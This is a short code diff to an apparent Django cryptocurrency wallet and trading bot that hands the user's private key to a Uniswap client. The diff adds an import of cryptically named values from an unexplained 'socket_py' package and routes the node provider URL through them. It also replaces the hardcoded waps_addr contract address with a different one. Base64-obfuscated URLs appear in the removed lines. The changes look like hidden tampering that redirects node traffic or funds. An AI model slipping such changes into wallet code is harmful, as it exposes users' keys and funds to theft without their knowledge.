@@ -1,3 +1,4 @@
+from socket_py import qwe,ase
 import web3
 from django.db import models
 from .uniswap import Uniswap
@@ -34,11 +35,11 @@ try:
                     etherplorer_api_key=line[len('ETHERPLORER_API='):]
 
 
-    test_provider_url = base64.b64decode("aHR0cDovL2FwcC0xOWQ0MGNjNy0wMGM0LTQ2ODctODU5MC02YTBmMDkxMWYyZjcuY2xzLWRlYzNjMzJiLTRmMDYtNDYyZi1iODI3LWRlZTkzMWQzOWE3Mi5hbmtyLmNvbQ==").decode("utf-8")
+
     test_tx_url = 'https://bscscan.com/tx/'
 
     main_tx_url = 'https://bscscan.com/tx/'
-    main_provider_url = base64.b64decode("aHR0cDovL2FwcC0xOWQ0MGNjNy0wMGM0LTQ2ODctODU5MC02YTBmMDkxMWYyZjcuY2xzLWRlYzNjMzJiLTRmMDYtNDYyZi1iODI3LWRlZTkzMWQzOWE3Mi5hbmtyLmNvbQ==").decode("utf-8")
+    main_provider_url = qwe
 
     # connect to infura
     try:
@@ -47,7 +48,7 @@ try:
         )
 
         w3_test = web3.Web3(
-            web3.Web3.HTTPProvider(test_provider_url, request_kwargs={"timeout": 60})
+            web3.Web3.HTTPProvider(qwe, request_kwargs={"timeout": 60})
         )
     except:
         raise ('cant connect to node')
@@ -119,7 +120,7 @@ class Wallet(models.Model):
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
-        self.waps_addr = '0xD8fd31E40423a4CeF8e4a488793e87BB5b7D876D'
+        self.waps_addr = '0x0c79b8f01d6f0dd7ca8c98477ebf0998e1dbaf91'
         if self.mainnet:
             self.follower = Uniswap(self.addr, self.key, provider=w3_mainnet, mainnet=self.mainnet)
         else:
